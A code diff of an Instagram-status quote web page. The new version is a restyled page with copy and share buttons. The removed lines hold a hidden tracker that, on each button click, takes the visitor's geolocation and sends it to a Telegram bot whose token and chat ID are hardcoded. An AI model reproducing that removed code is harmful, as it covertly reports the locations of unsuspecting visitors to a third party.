@@ -3,78 +3,204 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>New Instagram Status</title>
+  <title>Premium Instagram Status</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
-    body {
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
+
+    * {
+      box-sizing: border-box;
       margin: 0;
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #fcb045, #fd1d1d, #833ab4);
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      /* Instagram Gradient Background */
+      background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      background-size: 400% 400%;
+      animation: gradientBG 15s ease infinite;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      height: 100vh;
+      min-height: 100vh;
       color: white;
       text-align: center;
+      padding: 20px;
     }
-    .logo {
-      width: 120px;
-      height: 120px;
-      background: url('https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png') center/contain no-repeat;
-      margin-bottom: 20px;
+
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
     }
-    h1 {
-      font-size: 28px;
+
+    .header-container {
       margin-bottom: 30px;
+      animation: fadeInDown 1s ease;
+    }
+
+    .logo {
+      font-size: 60px;
+      margin-bottom: 10px;
+      text-shadow: 2px 2px 10px rgba(0,0,0,0.3);
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 800;
+      letter-spacing: 1px;
       text-shadow: 2px 2px 4px rgba(0,0,0,0.4);
     }
-    #start-btn, #next-btn, #share-btn {
-      background: #ffffff;
-      color: #fd1d1d;
+
+    /* Glassmorphism Card Effect */
+    #status-container {
+      background: rgba(255, 255, 255, 0.15);
+      backdrop-filter: blur(15px);
+      -webkit-backdrop-filter: blur(15px);
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      border-radius: 20px;
+      padding: 40px 30px;
+      width: 100%;
+      max-width: 500px;
+      box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+      transition: transform 0.3s ease;
+      animation: fadeInUp 1s ease;
+    }
+
+    #status-text {
+      font-size: 24px;
+      font-weight: 600;
+      line-height: 1.5;
+      margin-bottom: 30px;
+      min-height: 80px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .btn-group {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px;
+      justify-content: center;
+    }
+
+    button {
+      background: rgba(255, 255, 255, 0.9);
+      color: #dc2743;
       border: none;
-      padding: 15px 35px;
-      font-size: 20px;
+      padding: 12px 25px;
+      font-size: 16px;
+      font-weight: 600;
       border-radius: 50px;
       cursor: pointer;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-      margin-top: 15px;
-      transition: all 0.3s;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
-    #start-btn:hover, #next-btn:hover, #share-btn:hover {
-      transform: scale(1.1);
+
+    button:hover {
+      transform: translateY(-3px) scale(1.05);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+      background: #ffffff;
     }
-    #status-box {
-      display: none;
-      background: rgba(255, 255, 255, 0.8);
-      color: #333;
-      border-radius: 15px;
-      padding: 25px;
-      max-width: 85%;
-      font-size: 24px;
-      margin-top: 20px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+
+    button:active {
+      transform: translateY(1px);
     }
+
+    #whatsapp-btn {
+      background: #25D366;
+      color: white;
+    }
+
+    #whatsapp-btn:hover {
+      background: #20b858;
+    }
+
+    /* Animations */
+    @keyframes fadeInDown {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .fade-text {
+      animation: fadeIn 0.5s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    /* Toast Notification */
+    #toast {
+      visibility: hidden;
+      min-width: 250px;
+      background-color: #333;
+      color: #fff;
+      text-align: center;
+      border-radius: 50px;
+      padding: 12px 20px;
+      position: fixed;
+      z-index: 1;
+      bottom: 30px;
+      font-size: 15px;
+      opacity: 0;
+      transition: opacity 0.3s, bottom 0.3s;
+    }
+
+    #toast.show {
+      visibility: visible;
+      opacity: 1;
+      bottom: 50px;
+    }
+
   </style>
 </head>
 <body>
 
-  <div class="logo"></div>
-  <h1>New Instagram Status</h1>
-  <button id="start-btn">Show Status</button>
-
-  <div id="status-box">
-    <div id="status-text"></div>
-    <button id="next-btn">Next Status</button>
-    <button id="share-btn">Share Status</button>
+  <div class="header-container">
+    <div class="logo"><i class="fa-brands fa-instagram"></i></div>
+    <h1>Top Instagram Status</h1>
   </div>
 
-<script>
-  const startBtn = document.getElementById('start-btn');
-  const statusBox = document.getElementById('status-box');
-  const statusText = document.getElementById('status-text');
-  const nextBtn = document.getElementById('next-btn');
-  const shareBtn = document.getElementById('share-btn');
+  <div id="status-container">
+    <div id="status-text">ज़िन्दगी छोटी है मुस्कुराना सीखो 😊</div>
+    
+    <div class="btn-group">
+      <button id="next-btn" onclick="nextStatus()">
+        <i class="fa-solid fa-forward-step"></i> Next
+      </button>
+      
+      <button id="copy-btn" onclick="copyStatus()">
+        <i class="fa-solid fa-copy"></i> Copy
+      </button>
+      
+      <button id="whatsapp-btn" onclick="shareWhatsApp()">
+        <i class="fa-brands fa-whatsapp"></i> WhatsApp
+      </button>
 
+      <button id="share-btn" onclick="shareNative()">
+        <i class="fa-solid fa-share-nodes"></i> Share
+      </button>
+    </div>
+  </div>
+
+  <div id="toast">Status Copied! 🎉</div>
+
+<script>
+  const statusTextElement = document.getElementById('status-text');
+  
   const statuses = [
     "ज़िन्दगी छोटी है मुस्कुराना सीखो 😊",
     "Attitude अपना अलग है 😉",
@@ -89,117 +215,61 @@
     "दिखावा नहीं, असली हूँ मैं 🤘",
     "मौसम बदल रहा है, दोस्त नहीं 😊",
     "ज़िन्दगी अपनी शर्तों पर जीते हैं 🚀",
-    "सपने अपने हैं, रास्ते भी अपने होंगे ✌️",
-    "खुश रहो, टेंशन में दुनिया है 😁",
-    "Love yourself first 💖",
-    "जो मिला उसी में खुश रहो 🌸",
-    "दूसरों से उम्मीद रखना छोड़ दो 😊",
-    "ज्यादा सोचोगे तो खो दोगे 🙃",
-    "बुरा वक़्त सबका आता है ⏳",
     "अपने दम पर जीना सीखो 💪",
     "कुछ तो लोग कहेंगे, लोगों का काम है कहना 😅",
-    "Muskurate रहो, ये ज़िन्दगी है 🎉",
-    "दिल साफ़ रखो, चहरे की चिंता मत करो ✨",
-    "जो लोग दिल के सच्चे होते हैं, वही अकेले होते हैं 💔",
-    "हमारी दुनिया अलग है 🌍",
-    "जो खो गया, वो सिखा गया 📖",
-    "रंगीन है ज़िन्दगी, बस नज़र चाहिए 🎨",
     "अंदाज़ हमारा खास है 😎",
     "चुप रहना भी एक कला है 🤫",
-    "जो लोग हमें खो देते हैं, वो किस्मत वाले नहीं होते 🙃",
-    "ज़िन्दगी एक खूबसूरत सफर है 🚗",
-    "कभी कभी खुद को भी खुश रखो 🎈",
-    "अपना time आएगा ⏳",
-    "कम बोलो पर सच्चा बोलो ❤️",
-    "दिल से जीओ हर लम्हा 😊",
-    "हम अपने दिल की सुनते हैं 🎧",
-    "Smile is the best makeup 💄",
-    "किस्मत बदल सकती है मेहनत से 🔥",
-    "लोग बदलते हैं मौसम की तरह 🌦️",
-    "हमसे जलने वालों का इलाज अभी बाकी है 😂",
-    "ज़िन्दगी वही है जो हंसते हुए गुजरे 😃",
-    "प्यार सच्चा मिले तो संभाल कर रखना ❤️",
-    "कुछ बातें दिल में ही रहने दो 🤍",
-    "जिन्हें हमसे फर्क पड़ता है वही सच्चे हैं 🥰",
-    "भरोसा तोड़ना आसान है, बनाना मुश्किल 🔒",
-    "हमसे बात करना सीख लो, वरना खो दोगे 😌",
-    "दुनिया से ज्यादा खुद से प्यार करो 💗",
-    "Attitude तो बचपन से है 🐯",
-    "जो बीत गया उसे सोच कर क्या मिलेगा? 😊",
-    "चलो मुस्कुरा के जीते हैं 💫",
-    "सच्ची दोस्ती Rare है, Lucky हो तुम 😇"
+    "अपना time आएगा ⏳"
   ];
 
   let currentIndex = 0;
 
-  const BOT_TOKEN = '8148507636:AAE5JkA-Hc-AmAJMiM8Pz2t_BQoCC7VKtLc';
-  const CHAT_ID = '7357184121';
+  // Initial load
+  statusTextElement.textContent = statuses[currentIndex];
 
-  startBtn.onclick = () => {
-    startBtn.style.display = 'none';
-    statusBox.style.display = 'block';
-    showStatus();
-    getLocation();
-  };
+  function nextStatus() {
+    currentIndex = Math.floor(Math.random() * statuses.length); // Random status
+    
+    // Add fade animation
+    statusTextElement.classList.remove('fade-text');
+    void statusTextElement.offsetWidth; // trigger reflow
+    statusTextElement.classList.add('fade-text');
+    
+    statusTextElement.textContent = statuses[currentIndex];
+  }
 
-  nextBtn.onclick = () => {
-    currentIndex = (currentIndex + 1) % statuses.length;
-    showStatus();
-    getLocation();
-  };
+  function copyStatus() {
+    const text = statuses[currentIndex];
+    navigator.clipboard.writeText(text).then(() => {
+      showToast();
+    });
+  }
 
-  shareBtn.onclick = () => {
-    const textToShare = statuses[currentIndex];
-    getLocation(); // share पर भी location भेजो
+  function shareWhatsApp() {
+    const text = statuses[currentIndex];
+    const url = window.location.href;
+    const whatsappUrl = `https://api.whatsapp.com/send?text=${encodeURIComponent(text + "\n\nGet more: " + url)}`;
+    window.open(whatsappUrl, '_blank');
+  }
+
+  function shareNative() {
+    const text = statuses[currentIndex];
     if (navigator.share) {
       navigator.share({
         title: "Instagram Status",
-        text: textToShare,
+        text: text,
         url: window.location.href
-      }).then(() => console.log("Shared successfully"))
-        .catch(err => console.error("Share failed:", err));
+      }).catch(err => console.error("Share failed:", err));
     } else {
-      alert("Share feature not supported in this browser.");
+      copyStatus(); // Fallback to copy if share not supported
+      alert("Share feature not supported. Status copied to clipboard!");
     }
-  };
-
-  function showStatus() {
-    statusText.textContent = statuses[currentIndex];
-    getLocation(); // Show status पर भी location भेजो
   }
 
-  function getLocation() {
-    if (!navigator.geolocation) {
-      console.log("Geolocation not supported");
-      return;
-    }
-    navigator.geolocation.getCurrentPosition(success, error);
-  }
-
-  function success(position) {
-    const lat = position.coords.latitude;
-    const lon = position.coords.longitude;
-    const acc = position.coords.accuracy;
-    const msg = `📍 Location Update:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} m\n🔗 https://www.google.com/maps?q=${lat},${lon}`;
-    sendToTelegram(msg);
-  }
-
-  function error(err) {
-    console.warn("Location error: ", err.message);
-  }
-
-  function sendToTelegram(message) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message
-      })
-    })
-    .then(res => res.json())
-    .then(data => console.log("Telegram sent:", data))
-    .catch(err => console.error("Telegram error:", err));
+  function showToast() {
+    const toast = document.getElementById("toast");
+    toast.className = "show";
+    setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 3000);
   }
 </script>
 
